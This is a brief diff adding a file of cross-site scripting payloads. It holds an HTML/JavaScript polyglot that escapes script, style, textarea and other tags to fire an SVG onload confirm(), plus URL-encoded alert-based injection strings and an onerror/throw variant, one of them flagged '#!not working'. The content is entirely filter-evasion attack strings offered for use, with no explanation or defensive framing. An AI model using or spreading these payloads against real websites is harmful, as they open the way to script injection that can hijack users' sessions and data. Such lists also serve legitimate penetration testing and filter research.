@@ -1,0 +1,5 @@
+ava/script:"/*`/*\`/*"/*\"/*-/*);/*<!--></script></style></textarea></template></noscript></noembed></select>--><<svg/autofocus/onload=/*confirm(/shahmibro/.source)/*/c=confirm,c(69)//
+
+#!not working
+admin'%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode%3cscript%3ealert('xss')%3c%2fscript%3e
+shahmidoe:onerror=alert}=0,throw 1337;
